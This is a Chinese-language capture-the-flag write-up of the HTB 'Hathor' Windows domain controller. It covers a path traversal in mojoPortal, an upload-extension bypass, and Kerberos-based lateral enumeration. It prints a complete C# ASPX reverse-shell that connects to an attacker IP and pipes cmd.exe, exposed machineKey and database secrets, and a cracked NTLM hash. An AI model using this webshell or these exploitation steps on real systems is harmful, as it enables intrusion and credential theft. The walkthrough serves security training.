---
title: HTB-Hathor Writeup
date: 2026-09-22T15:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - Windows
  - SMB
  - LDAP
  - 文件上传
  - 目录穿越
  - AppLocker
  - DLL劫持
---
## Nmap 扫描

使用 Nmap 扫描端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ sudo nmap --min-rate 10000 -p- 10.129.230.109 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-20 22:11 -0400
Nmap scan report for 10.129.230.109
Host is up (0.16s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
55786/tcp open  unknown
55809/tcp open  unknown
59050/tcp open  unknown
59728/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds
```

提取存活端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,55786,55809,59050,59728
```

对存活端口进行详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ sudo nmap -sT -sC -sV -O -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,55786,55809,59050,59728 10.129.230.109 -oA Nmap/detail
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-20 22:14 -0400
Nmap scan report for 10.129.230.109
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Home - mojoPortal
| http-robots.txt: 29 disallowed entries (15 shown)
| /CaptchaImage.ashx* /Admin/ /App_Browsers/ /App_Code/
| /App_Data/ /App_Themes/ /bin/ /Blog/ViewCategory.aspx$
| /Blog/ViewArchive.aspx$ /Data/SiteImages/emoticons /MyPage.aspx
|_/MyPage.aspx$ /MyPage.aspx* /NeatHtml/ /NeatUpload/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-21 02:13:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-21T02:15:04+00:00; -47s from scanner time.
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2026-09-21T01:50:07
|_Not valid after:  2027-09-21T01:50:07
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-21T02:15:04+00:00; -47s from scanner time.
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2026-09-21T01:50:07
|_Not valid after:  2027-09-21T01:50:07
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2026-09-21T01:50:07
|_Not valid after:  2027-09-21T01:50:07
|_ssl-date: 2026-09-21T02:15:04+00:00; -47s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=hathor.windcorp.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:hathor.windcorp.htb
| Not valid before: 2026-09-21T01:50:07
|_Not valid after:  2027-09-21T01:50:07
|_ssl-date: 2026-09-21T02:15:04+00:00; -47s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
55786/tcp open  msrpc         Microsoft Windows RPC
55809/tcp open  msrpc         Microsoft Windows RPC
59050/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59728/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: HATHOR; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-09-21T02:14:27
|_  start_date: N/A
|_clock-skew: mean: -47s, deviation: 0s, median: -47s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.22 seconds
```

靶机是一台域控制器，域名为 `windcorp.htb`，域控为 `hathor.windcorp.htb`；`80` 端口跑的是 `IIS 10.0`，站点标题是 `Home - mojoPortal`；SMB 签名为 `enabled and required`，域控默认要求 SMB 签名。

将暴露出来的域名解析进 Hosts 文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ tail -n 1 /etc/hosts
10.129.230.109 hathor.windcorp.htb windcorp.htb
```

## Web 指纹识别

访问 80 端口，发现可以注册用户，注册一个看看。

![](Pasted%20image%2020260921102852.png)

使用刚注册的用户登陆后台，发现有一个用户 `Admin`，可能是管理员账号。

![](Pasted%20image%2020260921103235.png)

同时在 `robots.txt` 中找到大量暴露出来的接口。

![](Pasted%20image%2020260921103111.png)

对 Web 做指纹识别，确认是 `mojoPortal`，`ASP.NET 4.0.30319` 运行在 `Microsoft-IIS/10.0` 上。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ whatweb http://hathor.windcorp.htb/
http://hathor.windcorp.htb/ [200 OK] ASP_NET[4.0.30319], Bootstrap, Cookies[ASP.NET_SessionId], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], HttpOnly[ASP.NET_SessionId], IP[10.129.230.109], JQuery[3.2.1], Microsoft-IIS[10.0], OpenSearch[http://hathor.windcorp.htb/SearchEngineInfo.ashx], Script[text/javascript], Title[Home - mojoPortal][Title element contains newline(s)!], X-Powered-By[ASP.NET], X-UA-Compatible[ie=edge]
```

搜索发现 `mojoPortal` 的默认 Admin 凭据，尝试登陆。

![](Pasted%20image%2020260921104757.png)

使用 Admin 默认凭据登陆上后台了。

![](Pasted%20image%2020260921104850.png)

## Design Tools 任意文件读取

浏览发现具体的版本，但是没在网上搜到对应系统的可用 CVE。

![](Pasted%20image%2020260921105430.png)

后台的 Design Tools 里有个皮肤 CSS 编辑器 `CssEditor.aspx`，它的 `s` 与 `f` 参数没有任何过滤，而是直接拼接后交给 `Server.MapPath`。

```bash
skinBasePath = "~/Data/Sites/" + siteSettings.SiteId + "/skins/";
cssFile = WebUtils.ParseStringFromQueryString("f", string.Empty);
File.ReadAllText(Server.MapPath(skinBasePath + skinName + "/" + cssFile), Encoding.UTF8);
```

![](Pasted%20image%2020260921110646.png)

从 `skins` 目录往上退 4 层就落在了应用根，可以读取任意文本文件。

![](Pasted%20image%2020260921110737.png)

读取 `Web.config`。

```bash
http://hathor.windcorp.htb/DesignTools/CssEditor.aspx?s=../../../..&f=Web.config
```

![](Pasted%20image%2020260921112603.png)

`machineKey` 是 mojoPortal 公开发布版里的默认值，密钥是公开的，理论上可以伪造 ViewState 反序列化。

```bash
      <machineKey validationKey="55BA53B475CCAE0992D6BF9FE463A5E97F00C6C16DA3D7DF9202E560078AB501643C15514785FEE30FEF26FC27F5CE594B42FFCA55452EF90E8A056B4DAE9F39" decryptionKey="939232D527AC4CD3E449441FE887DA110A16C1A36924C424CBAAE3F00282436C" validation="SHA1" decryption="AES" />
      
```

```bash
decryptionKey = 939232D527AC4CD3E449441FE887DA110A16C1A36924C424CBAAE3F00282436
```

```bash
	<add key="MSSQLConnectionString" value="server=localhost;database=CMS;UID=cmsuser;PWD=flskeplw#3ddsaOpP;" />
```

补扫 1433/1434 端口，显示 `filtered`，数据库只能本机访问。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ nmap -sV -p 1433,1434 10.129.230.109
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-21 01:40 -0400
Nmap scan report for hathor.windcorp.htb (10.129.230.109)
Host is up (0.13s latency).

PORT     STATE    SERVICE  VERSION
1433/tcp filtered ms-sql-s
1434/tcp filtered ms-sql-m

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds
```

验证一下 `cmsuser` 是不是域账号。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ impacket-getTGT windcorp.htb/cmsuser:'flskeplw#3ddsaOpP' -dc-ip 10.129.230.109

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

## 文件上传

`mojoPortal` 的文件管理器对上传做了严格的拓展名白名单，`.aspx` 传不上去，但源码里有个明显的缺口：

```bash
// Web/Controllers/FileManager/FileServiceController.cs -> CopyItem()
if (AllowedExtension(file))            // 只校验【源文件】扩展名
{
    string newFile = FilePath(newPath + "/" + CleanFileName(singleFileName, "file"));
    result = fileSystem.CopyFile(file, newFile, overwriteExistingFiles);   // 目标名不过白名单
}
```

ASP.NET 的 WebForms 运行时编译模型。当请求进来时，IIS 把 `*.aspx` 交给 ASP.NET 读取文件里的 `<% %>` / `<script runat="server">`，动态编译成一个程序集并执行。

当文件落在 Web 可访问目录里、拓展名是 IIS 隐射给 ASP.NET 的、内容是合法可编译的页面代码，访问的那一刻就等于在服务器上执行了我们写的代码。

先以白名单里的 `.txt` 上传 webshell，再用文件管理器的 Copy 功能把目标文件夹名改成 `.aspx`。

先写一个最小化 POC 验证确实会被执行。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor/POC]
└─$ cat poc.txt
<%@ Page Language="C#" %><% Response.ContentType="text/plain"; Response.Write("RCE-OK|" + System.Environment.UserName + "|" + System.Environment.MachineName); %>
```

![](Pasted%20image%2020260921143323.png)

![](Pasted%20image%2020260921143428.png)

访问发现 POC 被执行了。

![](Pasted%20image%2020260921143844.png)

写一个反弹 shell，用同样的手法上传文件。

```bash
<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    var t = new System.Threading.Thread(Shell);   // 关键：不在请求线程里阻塞
    t.IsBackground = true;
    t.Start();
    Response.ContentType = "text/plain";
    Response.Write("ok");
}

private static void Shell()
{
    try
    {
        var c = new System.Net.Sockets.TcpClient("10.10.16.151", 4444);
        var s = c.GetStream();
        var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe");
        psi.RedirectStandardInput = true;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        var p = System.Diagnostics.Process.Start(psi);

        Pump(p.StandardOutput.BaseStream, s);     // cmd 标准输出 -> socket
        Pump(p.StandardError.BaseStream, s);      // cmd 标准错误 -> socket

        var buf = new byte[4096];                 // socket -> cmd 标准输入
        int n;
        while ((n = s.Read(buf, 0, buf.Length)) > 0)
        {
            p.StandardInput.BaseStream.Write(buf, 0, n);
            p.StandardInput.BaseStream.Flush();
        }
        try { p.Kill(); } catch { }
        c.Close();
    }
    catch { }
}

private static void Pump(System.IO.Stream from, System.IO.Stream to)
{
    var t = new System.Threading.Thread(() => {
        try {
            var buf = new byte[4096];
            int n;
            while ((n = from.Read(buf, 0, buf.Length)) > 0) { to.Write(buf, 0, n); to.Flush(); }
        } catch { }
    });
    t.IsBackground = true;
    t.Start();
}
</script>
```

Kali 开启监听，访问 POC 得到反弹过来的 `windcorp` 环境。

对实操过程中遇到的几个问题做下复盘：直接传 `nc.exe` 会被 AppLocker 拦截，让连接从 IIS 进程里发起，写一个纯托管代码的 ASPX 反弹页，用 `TcpClient` 连回监听端，把收到的命令交给 `cmd.exe` 执行并回传结果。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor/POC]
└─$ sudo rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.230.109] 62936
whoami
windcorp\web
```

## 内网信息收集

先执行 `whoami /all` 确认一下权限，由于没有提示符，后面 echo 一个东西方便确认命令执行完成。

权限里没有 `SeImpersonatePrivilege`，无法使用 Potato 系列提权。

```bash
whoami /all & echo ----                                                                                                       
                                                                                                                              
USER INFORMATION                                                                                                              
----------------                                                                                                              
                                                                                                                              
User Name    SID                                                                                                              
============ ===============================================                                                                  
windcorp\web S-1-5-21-3783586571-2109290616-3725730865-22101                                                                  
                                                                                                                              
                                                                                                                              
GROUP INFORMATION                                                                                                             
-----------------                                                                                                             
                                                                                                                              
Group Name                                 Type             SID                                                           Attr
ibutes                                                                                                                        
========================================== ================ ============================================================= ====
==============================================                                                                                
Everyone                                   Well-known group S-1-1-0                                                       Mand
atory group, Enabled by default, Enabled group                                                                                
BUILTIN\Users                              Alias            S-1-5-32-545                                                  Mand
atory group, Enabled by default, Enabled group                                                                                
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                  Mand
atory group, Enabled by default, Enabled group                                                                                
NT AUTHORITY\BATCH                         Well-known group S-1-5-3                                                       Mand
atory group, Enabled by default, Enabled group                                                                                
CONSOLE LOGON                              Well-known group S-1-2-1                                                       Mand
atory group, Enabled by default, Enabled group                                                                                
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11
atory group, Enabled by default, Enabled group                                                                                
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                      Mand
atory group, Enabled by default, Enabled group                 
BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568                                                  Mand
atory group, Enabled by default, Enabled group                 
LOCAL                                      Well-known group S-1-2-0                                                       Mand
atory group, Enabled by default, Enabled group                 
IIS APPPOOL\DefaultAppPool                 Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 Mand
atory group, Enabled by default, Enabled group                 
Authentication authority asserted identity Well-known group S-1-18-1                                                      Mand
atory group, Enabled by default, Enabled group                 
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                       



PRIVILEGES INFORMATION         
----------------------         

Privilege Name                Description                        State                                                        
============================= ================================== ========                                                     
SeAssignPrimaryTokenPrivilege Replace a process level token      Disabled                                                     
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled                                                     
SeMachineAccountPrivilege     Add workstations to domain         Disabled                                                     
SeAuditPrivilege              Generate security audits           Disabled                                                     
SeChangeNotifyPrivilege       Bypass traverse checking           Enabled                                                      
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled 


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
----

```

查看根目录，根目录里有 `Get-bADpassword`、`script`、`share`、`StorageReprts` 等非默认目录， `Get-bADpassword` 是口令审计工具，优先查看。

```bash
dir C:\                                                                                                                       
 Volume in drive C has no label.                                                                                              
 Volume Serial Number is BE61-D5E0                                                                                            
                                                                                                                              
 Directory of C:\                                                                                                             
                                                                                                                              
10/12/2022  09:30 PM    <DIR>          Get-bADpasswords                                                                       
10/02/2021  08:24 PM    <DIR>          inetpub                                                                                
10/07/2021  09:38 AM    <DIR>          Microsoft                                                                              
05/08/2021  10:20 AM    <DIR>          PerfLogs                                                                               
03/25/2022  09:54 PM    <DIR>          Program Files                                                                          
02/15/2022  09:42 PM    <DIR>          Program Files (x86)                                                                    
12/29/2021  11:17 PM    <DIR>          script                                                                                 
09/21/2026  08:58 AM    <DIR>          share                                                                                  
07/07/2021  07:05 PM    <DIR>          StorageReports                                                                         
02/16/2022  11:00 PM    <DIR>          Users                                                                                  
04/19/2022  02:44 PM    <DIR>          Windows                                                                                
               0 File(s)              0 bytes                                                                                 
              11 Dir(s)   9,355,157,504 bytes free
dir C:\Get-bADpasswords
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0
```

枚举工具目录。

```bash
dir C:\Get-bADpasswords
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of C:\Get-bADpasswords

10/12/2022  09:30 PM    <DIR>          .
09/29/2021  08:18 PM    <DIR>          Accessible
10/12/2022  10:04 PM            11,694 CredentialManager.psm1
03/21/2022  03:59 PM            20,320 Get-bADpasswords.ps1
09/29/2021  06:53 PM           177,250 Get-bADpasswords_2.jpg
10/12/2022  10:04 PM             5,184 Helper_Logging.ps1
10/12/2022  10:04 PM             6,561 Helper_Passwords.ps1
09/29/2021  06:53 PM           149,012 Image.png
09/29/2021  06:53 PM             1,512 LICENSE.md
10/12/2022  10:04 PM             4,499 New-bADpasswordLists-Common.ps1
10/12/2022  10:04 PM             4,335 New-bADpasswordLists-Custom.ps1
10/12/2022  10:04 PM             4,491 New-bADpasswordLists-customlist.ps1
10/12/2022  10:04 PM             4,740 New-bADpasswordLists-Danish.ps1
10/12/2022  10:04 PM             4,594 New-bADpasswordLists-English.ps1
10/12/2022  10:04 PM             4,743 New-bADpasswordLists-Norwegian.ps1
09/29/2021  06:54 PM    <DIR>          PSI
09/29/2021  06:53 PM             6,567 README.md
10/12/2022  10:04 PM             3,982 run.vbs
09/29/2021  06:54 PM    <DIR>          Source
              15 File(s)        409,484 bytes
               4 Dir(s)   9,355,091,968 bytes free

```

枚举 `C:\Get-bADpasswords\Accessible`。

```bash
dir C:\Get-bADpasswords\Accessible & echo .DONE.
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of C:\Get-bADpasswords\Accessible

09/29/2021  08:18 PM    <DIR>          .
10/12/2022  09:30 PM    <DIR>          ..
09/29/2021  06:54 PM    <DIR>          AccountGroups
09/21/2026  04:40 AM    <DIR>          CSVs
09/29/2021  06:53 PM               692 info.txt
09/21/2026  04:40 AM    <DIR>          Logs
09/29/2021  10:10 PM    <DIR>          PasswordLists
               1 File(s)            692 bytes
               6 Dir(s)   9,354,858,496 bytes free
.DONE.

```

导出目录里有一批 CSV，把这些 CSV 全部读取出来。

```bash
dir C:\Get-bADpasswords\Accessible\CSVs
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of C:\Get-bADpasswords\Accessible\CSVs

09/21/2026  04:40 AM    <DIR>          .
09/29/2021  08:18 PM    <DIR>          ..
10/03/2021  05:35 PM               248 exported_windcorp-03102021-173510.csv
10/03/2021  06:07 PM               248 exported_windcorp-03102021-180635.csv
10/03/2021  06:21 PM               112 exported_windcorp-03102021-182114.csv
10/03/2021  06:22 PM               112 exported_windcorp-03102021-182259.csv
10/03/2021  06:28 PM               248 exported_windcorp-03102021-182627.csv
10/03/2021  06:52 PM               248 exported_windcorp-03102021-185058.csv
10/04/2021  11:37 AM               248 exported_windcorp-04102021-113140.csv
10/05/2021  06:40 PM               248 exported_windcorp-05102021-183949.csv
10/13/2022  09:13 PM               248 exported_windcorp-13102022-210856.csv
10/13/2022  09:13 PM               248 exported_windcorp-13102022-210946.csv
03/17/2022  05:40 AM               112 exported_windcorp-17032022-044053.csv
03/18/2022  05:40 AM               112 exported_windcorp-18032022-044046.csv
09/21/2026  04:42 AM               248 exported_windcorp-21092026-044054.csv
              13 File(s)          2,680 bytes
               2 Dir(s)   9,354,588,160 bytes free

```

```bash
type C:\Get-bADpasswords\Accessible\CSVs\*.csv & echo .DONE.                                                                  
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)                
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passw
ords-v7'                                                                                                                      
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)                
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passw
ords-v7'                                                                                                                      
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)                
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)                
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)                
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passw
ords-v7'                                                                                                                      
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passw
ords-v7'
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passw
ords-v7'
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passw
ords-v7'
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passw
ords-v7'
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passw
ords-v7'
.DONE.
```

CSV 是口令审计的结果，里面有一个账号命中 `BeatriceMill`，NTLM 哈希为 `9cb01504ba0247ad5c6e08f7ccae7903`。

```bash
klist & echo .DONE.


Current LogonId is 0:0x8c3b0

Cached Tickets: (1)

#0>     Client: web @ WINDCORP.HTB
        Server: krbtgt/WINDCORP.HTB @ WINDCORP.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
        Start Time: 9/21/2026 3:58:44 (local)
        End Time:   9/21/2026 13:58:44 (local)
        Renew Time: 9/28/2026 3:58:44 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY 
        Kdc Called: HATHOR
.DONE.
```

使用 hashcat 破解 BeatriceMill 的凭据，得到密码 `!!!!ilovegood17`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor/Nmap]
└─$ sudo hashcat -m 1000 9cb01504ba0247ad5c6e08f7ccae7903 /usr/share/wordlists/rockyou.txt
[sudo] password for kali:
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (26771 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

9cb01504ba0247ad5c6e08f7ccae7903:!!!!ilovegood17

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 9cb01504ba0247ad5c6e08f7ccae7903
Time.Started.....: Mon Sep 21 03:18:11 2026 (2 secs)
Time.Estimated...: Mon Sep 21 03:18:13 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  7005.4 kH/s (0.12ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14344192/14344385 (100.00%)
Rejected.........: 0/14344192 (0.00%)
Restore.Point....: 14336000/14344385 (99.94%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: #!hottie ->  ladykitz
Hardware.Mon.#01.: Util: 18%

Started: Mon Sep 21 03:18:01 2026
Stopped: Mon Sep 21 03:18:14 2026
```

这台机器 NTLM 认证被禁用，凭据只能走 Kerberos。

用 kinit 取票。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor/Nmap]
└─$ kinit beatricemill
Password for beatricemill@WINDCORP.HTB:
┌──(kali㉿kali)-[~/Work/Kali/Hathor/Nmap]
└─$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: beatricemill@WINDCORP.HTB

Valid starting       Expires              Service principal
09/21/2026 03:21:21  09/21/2026 13:21:21  krbtgt/WINDCORP.HTB@WINDCORP.HTB
	renew until 09/22/2026 03:21:03
```

把票据写入 `/tmp/krb5cc_1000`，后续 SMB、LDAP 操作都依赖它。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor/Nmap]
└─$ export KRB5CCNAME=/tmp/krb5cc_1000
```

## ginawild

使用 nxc 枚举 smb 共享，发现一个可读可写的非默认共享文件夹 `share`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor/Nmap]
└─$ nxc smb hathor.windcorp.htb --use-kcache --shares
SMB         hathor.windcorp.htb 445    hathor           [*]  x64 (name:hathor) (domain:windcorp.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         hathor.windcorp.htb 445    hathor           [+] WINDCORP.HTB\beatricemill from ccache
SMB         hathor.windcorp.htb 445    hathor           [*] Enumerated shares
SMB         hathor.windcorp.htb 445    hathor           Share           Permissions     Remark
SMB         hathor.windcorp.htb 445    hathor           -----           -----------     ------
SMB         hathor.windcorp.htb 445    hathor           ADMIN$                          Remote Admin
SMB         hathor.windcorp.htb 445    hathor           C$                              Default share
SMB         hathor.windcorp.htb 445    hathor           IPC$            READ            Remote IPC
SMB         hathor.windcorp.htb 445    hathor           NETLOGON        READ            Logon server share
SMB         hathor.windcorp.htb 445    hathor           share           READ,WRITE
SMB         hathor.windcorp.htb 445    hathor           SYSVOL          READ            Logon server share
```

用 smbclient 看看这个文件夹里有什么。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor/Nmap]                                                                       03:32 [12/200]
└─$ impacket-smbclient -k windcorp.htb/beatricemill@hathor.windcorp.htb                                                       
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                    
                                                                                                                              
Password:                                                                                                                     
Type help for list of commands                                                                                                
# share                                                                                                                       
*** Unknown syntax: share                                                                                                     
# shares                                                                                                                      
ADMIN$                                                                                                                        
C$                                                                                                                            
IPC$                                                                                                                          
NETLOGON                                                                                                                      
share
SYSVOL
# use share
# ls
drw-rw-rw-          0  Mon Sep 21 03:28:59 2026 .
drw-rw-rw-          0  Tue Apr 19 08:45:15 2022 ..
-rw-rw-rw-    1013928  Mon Sep 21 03:30:01 2026 AutoIt3_x64.exe
-rw-rw-rw-    4601208  Mon Sep 21 03:28:59 2026 Bginfo64.exe
drw-rw-rw-          0  Mon Mar 21 17:22:59 2022 scripts
# cd scripts
# ls
drw-rw-rw-          0  Mon Mar 21 17:22:59 2022 .
drw-rw-rw-          0  Mon Sep 21 03:28:59 2026 ..
-rw-rw-rw-    1076736  Mon Sep 21 03:30:58 2026 7-zip64.dll
-rw-rw-rw-      54739  Sun Jan 23 05:54:21 2022 7Zip.au3
-rw-rw-rw-       2333  Sun Jan 23 05:54:21 2022 ZipExample.zip
